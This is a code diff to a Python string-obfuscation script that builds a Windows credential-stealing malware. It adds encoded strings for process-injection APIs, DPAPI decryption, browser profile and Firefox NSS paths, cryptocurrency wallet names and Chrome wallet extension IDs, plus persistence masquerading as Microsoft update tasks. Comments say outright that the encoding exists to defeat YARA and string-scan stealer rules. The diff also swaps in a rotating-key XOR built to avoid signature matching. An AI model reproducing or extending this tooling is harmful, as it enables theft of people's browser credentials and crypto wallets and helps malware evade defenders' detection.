@@ -46,6 +46,7 @@ STRINGS = {
     "NtQueryInformationProcess":  "fn_NtQueryInformationProcess",
     "NtContinue":                 "fn_NtContinue",
     "NtWaitForSingleObject":      "fn_NtWaitForSingleObject",
+    "NtQuerySystemInformation":   "fn_NtQuerySystemInformation",
 
     # ntdll helpers / ETW
     "RtlCaptureContext":          "fn_RtlCaptureContext",
@@ -101,17 +102,80 @@ STRINGS = {
     "GetNativeSystemInfo":        "fn_GetNativeSystemInfo",
     "GlobalMemoryStatusEx":       "fn_GlobalMemoryStatusEx",
     "VirtualProtect":             "fn_VirtualProtect",
+    "VirtualAlloc":               "fn_VirtualAlloc",
+    "CreateMutexW":               "fn_CreateMutexW",
+    "ReleaseMutex":               "fn_ReleaseMutex",
+    "MoveFileExA":                "fn_MoveFileExA",
+    "DuplicateHandle":            "fn_DuplicateHandle",
+    "OpenProcess":                "fn_OpenProcess",
     "Sleep":                      "fn_Sleep",
     "SetEvent":                   "fn_SetEvent",
-    "GetThreadContext":           "fn_GetThreadContext",
-    "SetThreadContext":           "fn_SetThreadContext",
+    "CreateFileMappingA":         "fn_CreateFileMappingA",
+    "CreateFileMappingW":         "fn_CreateFileMappingW",
+    "OpenFileMappingA":           "fn_OpenFileMappingA",
     "MapViewOfFile":              "fn_MapViewOfFile",
     "UnmapViewOfFile":            "fn_UnmapViewOfFile",
-    "AddVectoredExceptionHandler":"fn_AddVectoredExceptionHandler",
+    "WriteFile":                  "fn_WriteFile",
+    "ReadFile":                   "fn_ReadFile",
+    "SetFilePointer":             "fn_SetFilePointer",
+    "GetFileSizeEx":              "fn_GetFileSizeEx",
+    "CreateFileA":                "fn_CreateFileA",
+    "CreateFileW":                "fn_CreateFileW",
+    "DeleteFileA":                "fn_DeleteFileA",
+    "CopyFileA":                  "fn_CopyFileA",
+    "FindFirstFileA":             "fn_FindFirstFileA",
+    "FindNextFileA":              "fn_FindNextFileA",
+    "FindClose":                  "fn_FindClose",
+    "GetFileAttributesA":         "fn_GetFileAttributesA",
+    "QueryFullProcessImageNameW": "fn_QueryFullProcessImageNameW",
     "CreateNamedPipeA":           "fn_CreateNamedPipeA",
     "ConnectNamedPipe":           "fn_ConnectNamedPipe",
     "IsWow64Process":             "fn_IsWow64Process",
     "RtlGetVersion":              "fn_RtlGetVersion",
+    "GetSystemDirectoryW":        "fn_GetSystemDirectoryW",
+    "IsProcessorFeaturePresent":  "fn_IsProcessorFeaturePresent",
+    "VirtualAllocEx":             "fn_VirtualAllocEx",
+    "VirtualFreeEx":              "fn_VirtualFreeEx",
+    "VirtualQueryEx":             "fn_VirtualQueryEx",
+    "ReadProcessMemory":          "fn_ReadProcessMemory",
+    "WriteProcessMemory":         "fn_WriteProcessMemory",
+    "CreateThread":               "fn_CreateThread",
+    "CreateRemoteThread":         "fn_CreateRemoteThread",
+    "CreateToolhelp32Snapshot":   "fn_CreateToolhelp32Snapshot",
+    "Process32First":             "fn_Process32First",
+    "Process32FirstW":            "fn_Process32FirstW",
+    "Process32Next":              "fn_Process32Next",
+    "Process32NextW":             "fn_Process32NextW",
+    "Thread32First":              "fn_Thread32First",
+    "Thread32Next":               "fn_Thread32Next",
+
+    # bcrypt.dll — loaded dynamically to hide AES/hash ops from IAT
+    "bcrypt.dll":                           "dll_bcrypt",
+    "BCryptGenRandom":                      "fn_BCryptGenRandom",
+    "BCryptOpenAlgorithmProvider":          "fn_BCryptOpenAlgorithmProvider",
+    "BCryptSetProperty":                    "fn_BCryptSetProperty",
+    "BCryptGetProperty":                    "fn_BCryptGetProperty",
+    "BCryptCloseAlgorithmProvider":         "fn_BCryptCloseAlgorithmProvider",
+    "BCryptCreateHash":                     "fn_BCryptCreateHash",
+    "BCryptHashData":                       "fn_BCryptHashData",
+    "BCryptFinishHash":                     "fn_BCryptFinishHash",
+    "BCryptDestroyHash":                    "fn_BCryptDestroyHash",
+    "BCryptGenerateSymmetricKey":           "fn_BCryptGenerateSymmetricKey",
+    "BCryptDecrypt":                        "fn_BCryptDecrypt",
+    "BCryptDestroyKey":                     "fn_BCryptDestroyKey",
+
+    # crypt32.dll — loaded dynamically; cert management + DPAPI
+    "crypt32.dll":                      "dll_crypt32",
+    "CertOpenStore":                    "fn_CertOpenStore",
+    "CertAddEncodedCertificateToStore": "fn_CertAddEncodedCertificateToStore",
+    "CertOpenSystemStoreA":             "fn_CertOpenSystemStoreA",
+    "PFXImportCertStore":               "fn_PFXImportCertStore",
+    "CryptUnprotectData":               "fn_CryptUnprotectData",
+    "CertCloseStore":                   "fn_CertCloseStore",
+    "CertFreeCertificateContext":       "fn_CertFreeCertificateContext",
+    "CertFindCertificateInStore":       "fn_CertFindCertificateInStore",
+    "CertGetCertificateContextProperty":"fn_CertGetCertificateContextProperty",
+    "CertDeleteCertificateFromStore":   "fn_CertDeleteCertificateFromStore",
 
     # winspool.drv
     "winspool.drv":               "dll_winspool",
@@ -204,6 +268,9 @@ STRINGS = {
     "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}":
         "str_elevation_moniker",
 
+    # COM TypeLib registry prefix — avoids "SOFTWARE\Classes\TypeLib" in .rdata
+    "SOFTWARE\\Classes\\TypeLib\\":  "str_typelib_prefix",
+
     # Privilege names — decoded at runtime only where needed
     "SeDebugPrivilege":           "str_SeDebugPrivilege",
     "SeImpersonatePrivilege":     "str_SeImpersonatePrivilege",
@@ -248,13 +315,81 @@ STRINGS = {
     "windir":                     "str_windir",
     "SilentCleanup":              "str_SilentCleanup",
 
+    # SQLite header magic (16 bytes incl. null byte — for browser DB detection)
+    "SQLite format 3\x00": "str_sqlite_magic",
+
+    # Browser crypto wallet names
+    "MetaMask":              "str_wlt_MetaMask",
+    "Phantom":               "str_wlt_Phantom",
+    "Trust Wallet":          "str_wlt_TrustWallet",
+    "Coinbase Wallet":       "str_wlt_CoinbaseWallet",
+    "Coinbase":              "str_wlt_Coinbase",
+    "Binance Chain Wallet":  "str_wlt_BinanceChain",
+    "Keplr":                 "str_wlt_Keplr",
+    "OKX Wallet":            "str_wlt_OKXWallet",
+
+    # Desktop crypto wallet app names / paths
+    "Exodus":                "str_wlt_Exodus",
+    "exodus.wallet":         "str_wlt_exodus_sub",
+    "AtomicWallet":          "str_wlt_AtomicWallet",
+    "atomic":                "str_wlt_atomic",
+    "Local Storage":         "str_wlt_local_storage",
+    "leveldb":               "str_wlt_leveldb",
+    "Electrum":              "str_wlt_Electrum",
+    "wallets":               "str_wlt_wallets",
+    "Bitcoin":               "str_wlt_Bitcoin",
+    "wallet.dat":            "str_wlt_wallet_dat",
+    "Ethereum":              "str_wlt_Ethereum",
+    "keystore":              "str_wlt_keystore",
+    "Monero":                "str_wlt_Monero",
+    "monero-project":        "str_wlt_monero_proj",
+    "monero-gui":            "str_wlt_monero_gui",
+    "Litecoin":              "str_wlt_Litecoin",
+    "Dogecoin":              "str_wlt_Dogecoin",
+
+    # Chrome extension IDs for crypto wallets
+    "nkbihfbeogaeaoehlefnkodbefgpgknn": "ext_id_MetaMask",
+    "bfnaelmomeimhlpmgjnjophhpkkoljpa": "ext_id_Phantom",
+    "hnfanknocfeofbddgcijnmhnfnkdnaad": "ext_id_CoinbaseWallet",
+    "egjidjbpglichdcondbcbdnbeeppgdph": "ext_id_TrustWallet",
+    "fhbohimaelbohpjbbldcngcnapndodjp": "ext_id_BinanceChain",
+    "dmkamcknogkgcdfhhbddcghachkejeap": "ext_id_Keplr",
+    "mcohilncbfahbmgdjkbpemcciiolgcge": "ext_id_OKXWallet",
+
     # Persistence masquerade strings
     "Software\\Microsoft\\Windows\\CurrentVersion\\Run": "str_reg_run_key",
     "MicrosoftUpdateService":     "str_persist_reg_val",
     "Microsoft Corporation":      "str_persist_author",
     "LogonTrigger":               "str_persist_trigger_id",
     "MicrosoftEdgeUpdateTaskMachineCore": "str_persist_task_name",
+
+    # Browser profile paths — encoded to defeat YARA/string-scan browser-stealer rules
+    "Google\\Chrome\\User Data":                  "str_br_chrome_ud",
+    "Microsoft\\Edge\\User Data":                 "str_br_edge_ud",
+    "BraveSoftware\\Brave-Browser\\User Data":    "str_br_brave_ud",
+    "Chromium\\User Data":                        "str_br_chromium_ud",
+    "Opera Software\\Opera Stable":               "str_br_opera",
+    "Opera Software\\Opera GX Stable":            "str_br_operagx",
+    "Yandex\\YandexBrowser\\User Data":           "str_br_yandex_ud",
+    "Vivaldi\\User Data":                         "str_br_vivaldi_ud",
+
+    # Firefox paths — encoded so scanner can't match plaintext artifact
+    "Mozilla\\Firefox\\Profiles":              "str_ff_profiles_dir",
+    "Program Files\\Mozilla Firefox\\nss3.dll": "str_ff_nss3_pf",
+    "Program Files (x86)\\Mozilla Firefox\\nss3.dll": "str_ff_nss3_pf86",
+    "Program Files\\Firefox\\nss3.dll":        "str_ff_nss3_bare",
+    "%LOCALAPPDATA%\\Mozilla Firefox\\nss3.dll": "str_ff_nss3_local",
 }
+
+
+def _encode(plaintext: str, key: int) -> list[int]:
+    """Mirror of evs.c _evs_dec: rotating key XOR, no constant immediate."""
+    r = (key ^ 0x5C) & 0xFF
+    out = []
+    for b in plaintext.encode("latin-1"):
+        r = ((r << 3) | (r >> 5)) & 0xFF   # ROL 3
+        out.append(b ^ key ^ r)
+    return out
 
 
 def main():
@@ -283,7 +418,7 @@ def main():
             lines.append(f"/* --- {labels.get(group, group)} --- */")
             prev_group = group
 
-        enc = [b ^ key for b in plaintext.encode("latin-1")]
+        enc = _encode(plaintext, key)
         arr = ", ".join(f"0x{b:02x}" for b in enc)
         lines.append(
             f"static const unsigned char EVS_{suffix}[{len(enc)}]"
